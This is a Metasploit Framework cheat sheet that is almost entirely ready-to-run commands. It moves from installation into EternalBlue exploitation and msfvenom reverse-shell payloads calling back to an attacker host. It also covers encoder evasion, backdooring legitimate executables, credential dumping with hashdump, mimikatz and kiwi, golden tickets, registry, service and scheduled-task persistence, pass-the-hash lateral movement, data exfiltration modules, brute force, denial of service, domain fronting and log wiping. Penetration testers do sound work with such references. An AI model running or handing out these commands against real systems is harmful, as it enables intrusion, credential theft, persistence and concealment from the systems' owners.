# Metasploit Framework Cheat Sheet advanced

## Overview

The Metasploit Framework is the world's most widely used penetration testing framework, developed by Rapid7. Originally created by H.D. Moore in 2003, Metasploit has evolved into the de facto standard for exploit development, vulnerability validation, and penetration testing. The framework provides a comprehensive platform for developing, testing, and executing exploit code against remote target machines, making it an indispensable tool for security professionals, penetration testers, and red team operators.

Metasploit's modular architecture consists of exploits, payloads, encoders, nops, and auxiliary modules that can be combined in various ways to create sophisticated attack scenarios. The framework supports multiple interfaces including the command-line msfconsole, the web-based interface, and various APIs for integration with other security tools. With over 2,000 exploits and 500 payloads, Metasploit provides extensive coverage for testing security vulnerabilities across different operating systems, applications, and network services.

The framework's strength lies not only in its extensive exploit database but also in its payload generation capabilities, post-exploitation modules, and evasion techniques. Metasploit enables security professionals to simulate real-world attacks, validate security controls, and demonstrate the impact of vulnerabilities to stakeholders. Its integration with other security tools and its extensive documentation make it accessible to both beginners and advanced practitioners in the cybersecurity field.

## Installation

### Kali Linux Installation

Metasploit comes pre-installed on Kali Linux and can be updated using the package manager:

```bash
# Update Metasploit on Kali Linux
sudo apt update
sudo apt install metasploit-framework

# Initialize the database
sudo msfdb init

# Start PostgreSQL service
sudo systemctl start postgresql
sudo systemctl enable postgresql

# Verify installation
msfconsole --version
```

### Ubuntu/Debian Installation

```bash
# Add Rapid7 repository
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Alternative: Manual installation
sudo apt update
sudo apt install curl wget gnupg2 software-properties-common apt-transport-https ca-certificates

# Add Rapid7 GPG key
curl -fsSL https://apt.metasploit.com/metasploit-framework.gpg.key|sudo apt-key add -

# Add repository
echo "deb https://apt.metasploit.com/ lucid main"|sudo tee /etc/apt/sources.list.d/metasploit-framework.list

# Install Metasploit
sudo apt update
sudo apt install metasploit-framework

# Initialize database
sudo msfdb init
```

### CentOS/RHEL Installation

```bash
# Install dependencies
sudo yum install curl wget which

# Download and run installer
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
sudo ./msfinstall

# Initialize database
sudo msfdb init

# Start PostgreSQL
sudo systemctl start postgresql
sudo systemctl enable postgresql
```

### Docker Installation

```bash
# Pull official Metasploit image
docker pull metasploitframework/metasploit-framework

# Run Metasploit in Docker
docker run --rm -it -v "$\\\\{HOME\\\\}/.msf4:/home/msf/.msf4" metasploitframework/metasploit-framework

# Run with database persistence
docker run --rm -it -v "$\\\\{HOME\\\\}/.msf4:/home/msf/.msf4" -v "$\\\\{HOME\\\\}/msf-db:/opt/metasploit-framework/embedded/var/lib/postgresql" metasploitframework/metasploit-framework

# Create alias for easy access
echo 'alias msfconsole="docker run --rm -it -v \"$\\\\{HOME\\\\}/.msf4:/home/msf/.msf4\" metasploitframework/metasploit-framework"' >> ~/.bashrc
source ~/.bashrc
```

### Windows Installation

```powershell
# Download installer from official website
# https://windows.metasploit.com/metasploitframework-latest.msi

# Install using PowerShell (requires admin privileges)
Start-Process msiexec.exe -Wait -ArgumentList '/I metasploitframework-latest.msi /quiet'

# Verify installation
& "C:\metasploit-framework\bin\msfconsole.bat" --version

# Initialize database (requires PostgreSQL)
& "C:\metasploit-framework\bin\msfdb.bat" init
```

### macOS Installation

```bash
# Install using Homebrew
brew install metasploit

# Alternative: Download installer
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Initialize database
msfdb init

# Start PostgreSQL
brew services start postgresql
```

## Basic Usage

### Starting Metasploit Console

```bash
# Start msfconsole
msfconsole

# Start with specific database
msfconsole -d msf_database

# Start with custom resource script
msfconsole -r /path/to/script.rc

# Start in quiet mode
msfconsole -q

# Start with specific workspace
msfconsole -w workspace_name
```

### Database Management

```bash
# Initialize database
msfdb init

# Check database status
msfdb status

# Start database
msfdb start

# Stop database
msfdb stop

# Restart database
msfdb restart

# Delete database
msfdb delete

# Reinitialize database
msfdb reinit
```

### Basic Console Commands

```bash
# Get help
help
?

# Show version information
version

# Exit console
exit
quit

# Clear screen
clear

# Show banner
banner

# Load resource script
resource /path/to/script.rc

# Save command history
history -S /path/to/history.txt

# Load command history
history -L /path/to/history.txt
```

## Core Commands

### Search and Information

```bash
# Search for exploits
search type:exploit platform:windows
search cve:2017-0144
search name:eternal
search rank:excellent

# Search for payloads
search type:payload platform:windows arch:x64
search type:payload platform:linux format:elf

# Search for auxiliary modules
search type:auxiliary name:scanner

# Search for post-exploitation modules
search type:post platform:windows

# Show module information
info exploit/windows/smb/ms17_010_eternalblue
info payload/windows/x64/meterpreter/reverse_tcp

# Show module options
show options
show advanced
show evasion
show targets
show payloads

# Show available exploits
show exploits

# Show available payloads
show payloads

# Show auxiliary modules
show auxiliary

# Show post-exploitation modules
show post

# Show encoders
show encoders

# Show nops
show nops
```

### Module Selection and Configuration

```bash
# Use a module
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/portscan/tcp
use payload/windows/x64/meterpreter/reverse_tcp

# Set module options
set RHOSTS 192.168.1.100
set RHOST 10.0.0.1
set LHOST 192.168.1.50
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set global options
setg RHOSTS 192.168.1.0/24
setg LHOST 192.168.1.50

# Unset options
unset RHOSTS
unset PAYLOAD

# Unset global options
unsetg RHOSTS

# Show current settings
show options
show advanced

# Get option information
info -d RHOSTS

# Set advanced options
set PrependMigrate true
set PrependMigrateProc explorer.exe
set AutoRunScript post/windows/manage/migrate
```

### Target and Payload Management

```bash
# Show available targets
show targets

# Set specific target
set TARGET 0
set TARGET "Windows 7 SP1 x64"

# Show compatible payloads
show payloads

# Set payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set PAYLOAD linux/x86/shell/reverse_tcp
set PAYLOAD java/jsp_shell_reverse_tcp

# Generate payload
generate -f exe -o payload.exe
generate -f elf -o payload.elf
generate -f war -o payload.war

# Show payload options
show options

# Set payload options
set LHOST 192.168.1.50
set LPORT 4444
set EXITFUNC thread
```

## Exploitation Workflow

### Basic Exploitation Process

```bash
# 1. Search for exploit
search ms17-010

# 2. Use exploit module
use exploit/windows/smb/ms17_010_eternalblue

# 3. Show and set options
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50

# 4. Set payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LPORT 4444

# 5. Check if target is vulnerable
check

# 6. Run the exploit
exploit
run

# 7. Interact with session
sessions -l
sessions -i 1
```

### Advanced Exploitation Techniques

```bash
# Use specific target
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# Exploit with specific options
exploit -z  # Don't interact with session
exploit -j  # Run as job
exploit -J  # Force running in foreground

# Set advanced evasion options
set PrependMigrate true
set PrependMigrateProc explorer.exe
set AutoRunScript post/windows/manage/migrate

# Use encoders for evasion
set ENCODER x86/shikata_ga_nai
set ITERATIONS 3

# Set custom user agent
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Use custom templates
set TEMPLATE /path/to/template.exe
```

### Multi-Target Exploitation

```bash
# Set multiple targets
set RHOSTS 192.168.1.100-110
set RHOSTS file:/path/to/targets.txt
set RHOSTS 192.168.1.0/24

# Use threading for faster exploitation
set THREADS 10

# Run exploit against all targets
exploit

# Check all targets
check

# Use auxiliary scanner first
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
set THREADS 20
run
```

## Payload Generation

### MSFVenom Payload Generation

```bash
# Generate Windows executables
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Generate Linux executables
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload.elf

# Generate macOS executables
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o payload.macho

# Generate Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload.apk

# Generate iOS payload
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o payload.macho

# Generate web payloads
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o payload.war
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o payload.php
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o payload.asp
```

### Encoded Payloads

```bash
# Encode with shikata_ga_nai
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o encoded_payload.exe

# Multiple encoding iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o heavily_encoded.exe

# Use different encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/alpha_mixed -f exe -o alpha_encoded.exe

# Chain multiple encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -e x86/alpha_mixed -i 5 -f exe -o multi_encoded.exe
```

### Custom Templates and Formats

```bash
# Use custom template
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x /path/to/template.exe -f exe -o backdoored.exe

# Keep template behavior
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -x /path/to/template.exe -k -f exe -o backdoored.exe

# Generate shellcode
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f python
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f powershell

# Generate different formats
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f dll -o payload.dll
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f msi -o payload.msi
```

### Platform-Specific Payloads

```bash
# Windows payloads
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/vncinject/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o vnc.exe
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o ps.exe

# Linux payloads
msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf
msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=4444 -f elf -o bind.elf

# Multi-platform payloads
msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f jar -o payload.jar
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f py -o payload.py
```

## Session Management

### Basic Session Commands

```bash
# List active sessions
sessions

# List sessions with details
sessions -l

# Interact with session
sessions -i 1

# Kill session
sessions -k 1

# Kill all sessions
sessions -K

# Upgrade shell to meterpreter
sessions -u 1

# Run command on session
sessions -c "whoami" -i 1

# Run script on session
sessions -s /path/to/script.rb -i 1
```

### Session Interaction

```bash
# Background current session
background
bg

# Return to session
sessions -i 1

# Run local command
!ls
!pwd
!cat /etc/passwd

# Upload file to session
upload /local/file.txt C:\\Windows\\Temp\\file.txt

# Download file from session
download C:\\Windows\\System32\\drivers\\etc\\hosts /tmp/hosts

# Execute command
execute -f cmd.exe -a "/c whoami"
execute -f powershell.exe -a "-Command Get-Process"

# Get system information
sysinfo
getuid
getpid
```

### Advanced Session Management

```bash
# Route traffic through session
route add 10.0.0.0/24 1
route print
route delete 10.0.0.0/24

# Port forwarding
portfwd add -l 8080 -p 80 -r 192.168.1.100
portfwd list
portfwd delete -l 8080

# Pivot through session
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j

# Auto-route through session
use post/multi/manage/autoroute
set SESSION 1
run
```

## Meterpreter Commands

### System Information

```bash
# Get system information
sysinfo
getuid
getpid
ps

# Get environment variables
getenv
getenv PATH
getenv COMPUTERNAME

# Get network configuration
ipconfig
ifconfig
route

# Get system privileges
getprivs

# Check if running as system
getsystem

# Get current directory
pwd
getwd

# List drives
show_mount
```

### File System Operations

```bash
# Navigate file system
cd C:\\Windows
cd /etc
ls
dir

# Search for files
search -f *.txt
search -f config.* -d C:\\
search -f passwd -d /etc

# Download files
download C:\\Windows\\System32\\config\\SAM /tmp/SAM
download /etc/passwd /tmp/passwd

# Upload files
upload /tmp/payload.exe C:\\Windows\\Temp\\payload.exe
upload /tmp/script.sh /tmp/script.sh

# Edit files
edit C:\\Windows\\Temp\\file.txt
edit /tmp/file.txt

# Delete files
rm C:\\Windows\\Temp\\file.txt
del /tmp/file.txt

# Create directories
mkdir C:\\Windows\\Temp\\test
mkdir /tmp/test
```

### Process Management

```bash
# List processes
ps

# Get detailed process information
ps -A
ps -S

# Kill process
kill 1234

# Migrate to process
migrate 1234
migrate explorer.exe

# Execute programs
execute -f cmd.exe
execute -f powershell.exe -a "-Command Get-Process"
execute -f /bin/bash -a "-c 'id'"

# Run as different user
execute -f cmd.exe -u username -p password

# Create process
execute -f notepad.exe -H
```

### Network Operations

```bash
# Show network connections
netstat
netstat -an

# ARP table
arp

# Network interfaces
ipconfig
ifconfig

# Port forwarding
portfwd add -l 3389 -p 3389 -r 192.168.1.100
portfwd list
portfwd delete -l 3389

# Reverse port forwarding
portfwd add -R -l 8080 -p 80 -r 127.0.0.1

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
```

### Registry Operations (Windows)

```bash
# Enumerate registry keys
reg enumkey -k HKLM\\Software
reg enumkey -k HKCU\\Software

# Query registry values
reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion -v ProductName
reg queryval -k HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

# Set registry values
reg setval -k HKLM\\Software\\Test -v TestValue -t REG_SZ -d "Test Data"

# Delete registry values
reg deleteval -k HKLM\\Software\\Test -v TestValue

# Delete registry keys
reg deletekey -k HKLM\\Software\\Test
```

### Credential Operations

```bash
# Dump hashes
hashdump

# Load mimikatz
load mimikatz
wdigest
msv
ssp
tspkg
kerberos

# Load kiwi (newer mimikatz)
load kiwi
creds_all
creds_wdigest
creds_msv
creds_ssp
creds_tspkg
creds_kerberos

# Golden ticket
golden_ticket_create -u Administrator -d domain.com -s S-1-5-21-... -k aes256_key

# Silver ticket
kerberos_ticket_use /path/to/ticket.kirbi
```

### Persistence

```bash
# Create persistent backdoor
use exploit/windows/local/persistence
set SESSION 1
set STARTUP SYSTEM
run

# Registry persistence
reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -t REG_SZ -d "C:\\Windows\\Temp\\backdoor.exe"

# Service persistence
use post/windows/manage/persistence_exe
set SESSION 1
set REXEPATH C:\\Windows\\Temp\\backdoor.exe
run

# Scheduled task persistence
execute -f schtasks.exe -a "/create /tn Backdoor /tr C:\\Windows\\Temp\\backdoor.exe /sc onlogon"
```

## Post-Exploitation Modules

### Information Gathering

```bash
# System enumeration
use post/windows/gather/enum_system
use post/linux/gather/enum_system
set SESSION 1
run

# Network enumeration
use post/windows/gather/enum_domain
use post/windows/gather/enum_shares
use post/linux/gather/enum_network
set SESSION 1
run

# Credential gathering
use post/windows/gather/credentials/credential_collector
use post/windows/gather/smart_hashdump
use post/linux/gather/hashdump
set SESSION 1
run

# Application enumeration
use post/windows/gather/enum_applications
use post/windows/gather/enum_chrome
use post/windows/gather/enum_firefox
set SESSION 1
run

# File enumeration
use post/windows/gather/enum_files
use post/multi/gather/find_files
set SESSION 1
set SEARCH_FROM C:\\
set FILE_GLOBS *.txt,*.doc,*.pdf
run
```

### Privilege Escalation

```bash
# Windows privilege escalation
use post/windows/escalate/getsystem
use post/windows/escalate/bypassuac
use post/windows/escalate/bypassuac_injection
set SESSION 1
run

# Linux privilege escalation
use post/linux/escalate/cve_2021_4034
use post/linux/escalate/sudo_baron_samedit
set SESSION 1
run

# Suggest privilege escalation
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# UAC bypass
use exploit/windows/local/bypassuac_comhijack
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
run
```

### Lateral Movement

```bash
# Pass the hash
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.100
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
run

# WMI execution
use exploit/windows/local/wmi
set SESSION 1
set RHOSTS 192.168.1.100
run

# PowerShell remoting
use exploit/windows/local/powershell_remoting
set SESSION 1
set RHOSTS 192.168.1.100
run

# SSH lateral movement
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.0/24
set USERNAME root
set PASSWORD password
run
```

### Data Exfiltration

```bash
# File collection
use post/multi/gather/find_files
set SESSION 1
set SEARCH_FROM C:\\Users
set FILE_GLOBS *.doc,*.pdf,*.txt,*.xls
run

# Browser data
use post/windows/gather/enum_chrome
use post/windows/gather/enum_firefox
use post/windows/gather/enum_ie
set SESSION 1
run

# Email data
use post/windows/gather/outlook
use post/windows/gather/thunderbird_creds
set SESSION 1
run

# Database enumeration
use auxiliary/admin/mssql/mssql_enum
use auxiliary/admin/mysql/mysql_enum
set SESSION 1
run
```

### Persistence and Backdoors

```bash
# Registry persistence
use post/windows/manage/persistence_exe
set SESSION 1
set REXEPATH C:\\Windows\\Temp\\backdoor.exe
set STARTUP SYSTEM
run

# Service persistence
use post/windows/manage/persistence
set SESSION 1
set REXEPATH C:\\Windows\\Temp\\backdoor.exe
run

# Scheduled task
use post/windows/manage/schtask
set SESSION 1
set TASKNAME Backdoor
set REXEPATH C:\\Windows\\Temp\\backdoor.exe
run

# WMI persistence
use post/windows/manage/wmi_persistence
set SESSION 1
set REXEPATH C:\\Windows\\Temp\\backdoor.exe
run
```

## Auxiliary Modules

### Scanners

```bash
# Port scanning
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 21,22,23,25,53,80,110,443,993,995
set THREADS 20
run

# Service version detection
use auxiliary/scanner/http/http_version
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
set THREADS 10
run

# SMB enumeration
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers
set RHOSTS 192.168.1.0/24
run

# Web application scanning
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/files_dir
use auxiliary/scanner/http/http_put
set RHOSTS 192.168.1.100
set THREADS 10
run
```

### Brute Force Attacks

```bash
# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set THREADS 10
run

# FTP brute force
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
run

# HTTP basic auth brute force
use auxiliary/scanner/http/http_login
set RHOSTS 192.168.1.100
set AUTH_URI /admin
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
run

# SMB brute force
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
run
```

### Denial of Service

```bash
# TCP SYN flood
use auxiliary/dos/tcp/synflood
set RHOST 192.168.1.100
set RPORT 80
set THREADS 10
run

# HTTP slowloris
use auxiliary/dos/http/slowloris
set RHOST 192.168.1.100
set RPORT 80
run

# SMB DoS
use auxiliary/dos/windows/smb/ms09_001_write
set RHOST 192.168.1.100
run

# WiFi deauth
use auxiliary/dos/wifi/deauth
set INTERFACE wlan0
set BSSID 00:11:22:33:44:55
run
```

### SNMP Enumeration

```bash
# SNMP community scanner
use auxiliary/scanner/snmp/snmp_login
set RHOSTS 192.168.1.0/24
run

# SNMP enumeration
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS 192.168.1.100
set COMMUNITY public
run

# SNMP user enumeration
use auxiliary/scanner/snmp/snmp_enumusers
set RHOSTS 192.168.1.100
run

# SNMP process enumeration
use auxiliary/scanner/snmp/snmp_enumprocesses
set RHOSTS 192.168.1.100
run
```

## Database Integration

### Workspace Management

```bash
# List workspaces
workspace

# Create workspace
workspace -a project_name

# Switch workspace
workspace project_name

# Delete workspace
workspace -d project_name

# Rename workspace
workspace -r old_name new_name

# Show current workspace
workspace -v
```

### Host and Service Management

```bash
# Add hosts
db_import /path/to/nmap_scan.xml
hosts

# Add host manually
hosts -a 192.168.1.100 -n target1 -o "Windows 10"

# Show hosts
hosts
hosts -c address,name,os_name

# Search hosts
hosts 192.168.1.0/24
hosts -S windows

# Delete hosts
hosts -d 192.168.1.100

# Add services
services -a -p 80 -s http -h 192.168.1.100

# Show services
services
services -p 80
services -s http

# Delete services
services -d -p 80 -h 192.168.1.100
```

### Vulnerability Management

```bash
# Show vulnerabilities
vulns

# Add vulnerability
vulns -a -h 192.168.1.100 -n "MS17-010" -r "CVE-2017-0144"

# Search vulnerabilities
vulns -S ms17-010

# Show vulnerability details
vulns -v

# Export vulnerabilities
vulns -O /tmp/vulns.xml
```

### Credential Management

```bash
# Show credentials
creds

# Add credentials
creds -a -h 192.168.1.100 -u administrator -p password123 -t password

# Search credentials
creds -S administrator

# Show credential details
creds -v

# Export credentials
creds -O /tmp/creds.csv
```

### Loot Management

```bash
# Show loot
loot

# Add loot
loot -a -h 192.168.1.100 -t "password_file" -f /tmp/passwords.txt

# Search loot
loot -S password

# Export loot
loot -O /tmp/loot.xml
```

## Advanced Techniques

### Custom Module Development

```ruby
# Basic exploit module template
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = \\\\{\\\\})
    super(update_info(info,
      'Name'           => 'Custom Exploit',
      'Description'    => 'Custom exploit description',
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     => [['CVE', '2021-1234']],
      'Platform'       => 'win',
      'Targets'        => [['Windows Universal', \\\\{\\\\}]],
      'Payload'        => \\\\{
        'Space'    => 400,
        'BadChars' => "\x00\x0a\x0d"
      \\\\},
      'DisclosureDate' => '2021-01-01',
      'DefaultTarget'  => 0))

    register_options([
      Opt::RPORT(9999)
    ])
  end

  def check
    # Vulnerability check logic
    return Exploit::CheckCode::Vulnerable
  end

  def exploit
    # Exploitation logic
    connect
    print_status("Sending payload...")
    sock.put(payload.encoded)
    handler
    disconnect
  end
end
```

### Custom Payload Development

```ruby
# Basic payload module template
require 'msf/core'

module MetasploitModule
  CachedSize = 200

  include Msf::Payload::Single
  include Msf::Payload::Windows
  include Msf::Payload::Windows::Exec

  def initialize(info = \\\\{\\\\})
    super(merge_info(info,
      'Name'          => 'Custom Windows Payload',
      'Description'   => 'Custom payload description',
      'Author'        => ['Your Name'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86))

    register_options([
      OptString.new('CMD', [true, "Command to execute", 'calc.exe'])
    ])
  end

  def generate
    # Payload generation logic
    cmd = datastore['CMD']||'calc.exe'
    # Return shellcode
  end
end
```

### Evasion Techniques

```bash
# Use encoders
set ENCODER x86/shikata_ga_nai
set ITERATIONS 5

# Use custom templates
set TEMPLATE /path/to/legitimate.exe

# Modify payload behavior
set PrependMigrate true
set PrependMigrateProc explorer.exe

# Use HTTPS for C2
set LHOST 192.168.1.50
set LPORT 443
set HttpsUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Domain fronting
set HttpHostHeader legitimate-domain.com
set LHOST cdn-provider.com

# Custom user agents
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

# Sleep and jitter
set WfsDelay 30
set Jitter 25
```

### Automation and Scripting

```bash
# Resource scripts
echo "use exploit/multi/handler" > handler.rc
echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> handler.rc
echo "set LHOST 192.168.1.50" >> handler.rc
echo "set LPORT 4444" >> handler.rc
echo "exploit -j" >> handler.rc

# Load resource script
msfconsole -r handler.rc

# Ruby scripting
irb
framework = Msf::Simple::Framework.create
session = framework.sessions[1]
session.shell_command("whoami")

# Automation script
#!/usr/bin/env ruby
require 'msf/core'
require 'msf/base'

framework = Msf::Simple::Framework.create
exploit = framework.exploits.create('windows/smb/ms17_010_eternalblue')
exploit.datastore['RHOSTS'] = '192.168.1.100'
exploit.datastore['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
exploit.datastore['LHOST'] = '192.168.1.50'
exploit.datastore['LPORT'] = '4444'
exploit.exploit_simple('Payload' => exploit.datastore['PAYLOAD'])
```

## Integration with Other Tools

### Nmap Integration

```bash
# Import Nmap results
db_import /path/to/nmap_scan.xml

# Use Nmap from within Metasploit
db_nmap -sS -O 192.168.1.0/24
db_nmap -sV -p 1-1000 192.168.1.100

# Automated exploitation based on Nmap results
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
run

# Use discovered services
hosts -c address,name,os_name
services -c port,proto,name,state
```

### Burp Suite Integration

```bash
# Configure Burp proxy
set Proxies http:127.0.0.1:8080

# Use Burp findings
use auxiliary/scanner/http/dir_scanner
set RHOSTS target.com
set DICTIONARY /path/to/burp_discovered_dirs.txt
run

# Export session for Burp
sessions -l
sessions -C "netstat -an" -i 1 > network_connections.txt
```

### Cobalt Strike Integration

```bash
# Generate Cobalt Strike compatible payload
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.1.50 LPORT=80 -f raw|base64

# Use Cobalt Strike beacon
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_http
set LHOST 192.168.1.50
set LPORT 80
exploit -j

# Lateral movement coordination
route add 10.0.0.0/24 1
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
```

### OSINT Integration

```bash
# Use theHarvester results
use auxiliary/gather/search_email_collector
set DOMAIN target.com
run

# Shodan integration
use auxiliary/gather/shodan_search
set SHODAN_APIKEY your_api_key
set QUERY "apache city:\"New York\""
run

# Social engineering
use auxiliary/gather/social_engineering_toolkit
set TARGET_EMAIL admin@target.com
run
```

## Troubleshooting

### Common Issues and Solutions

```bash
# Database connection issues
msfdb status
msfdb reinit
sudo systemctl restart postgresql

# Module loading errors
reload_all
updatedb

# Payload generation failures
msfvenom --list formats
msfvenom --list encoders
msfvenom --list platforms

# Session connectivity issues
sessions -l
sessions -k 1
route print
route flush

# Permission issues
sudo chown -R $USER:$USER ~/.msf4
sudo chmod -R 755 ~/.msf4
```

### Performance Optimization

```bash
# Increase database performance
echo "shared_buffers = 256MB"|sudo tee -a /etc/postgresql/*/main/postgresql.conf
echo "effective_cache_size = 1GB"|sudo tee -a /etc/postgresql/*/main/postgresql.conf
sudo systemctl restart postgresql

# Optimize threading
set THREADS 20
set MaxSessions 10

# Memory optimization
ulimit -n 4096
echo "* soft nofile 4096"|sudo tee -a /etc/security/limits.conf
echo "* hard nofile 4096"|sudo tee -a /etc/security/limits.conf

# Clean up old sessions
sessions -K
db_rebuild_cache
```

### Debugging

```bash
# Enable verbose output
set VERBOSE true

# Debug mode
msfconsole -L -o /tmp/msf.log

# Ruby debugging
irb
load '/usr/share/metasploit-framework/lib/msf/core.rb'
framework = Msf::Simple::Framework.create

# Module debugging
use exploit/windows/smb/ms17_010_eternalblue
set VERBOSE true
check
```

## Security Considerations

### Operational Security

```bash
# Use VPN or proxy
set Proxies socks5:127.0.0.1:9050

# Randomize source ports
set CPORT 1024-65535

# Use legitimate user agents
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Implement delays
set WfsDelay 10
set Jitter 25

# Clean up artifacts
rm /tmp/payload.exe
history -c
```

### Legal and Ethical Considerations

```bash
# Document authorization
echo "Authorized penetration test - $(date)" > /tmp/authorization.txt
echo "Scope: 192.168.1.0/24" >> /tmp/authorization.txt
echo "Contact: security@company.com" >> /tmp/authorization.txt

# Limit scope
set RHOSTS 192.168.1.100-110  # Only authorized targets
set ExitOnSession true        # Limit session creation

# Avoid destructive actions
set DisablePayloadHandler true
set PrependMigrate false
```

### Data Protection

```bash
# Encrypt database
msfdb stop
sudo -u postgres pg_dump msf > /tmp/msf_backup.sql
gpg -c /tmp/msf_backup.sql
rm /tmp/msf_backup.sql

# Secure communications
set LHOST 192.168.1.50
set LPORT 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai

# Clean up logs
history -c
rm ~/.msf4/logs/*
sudo rm /var/log/postgresql/*
```

---

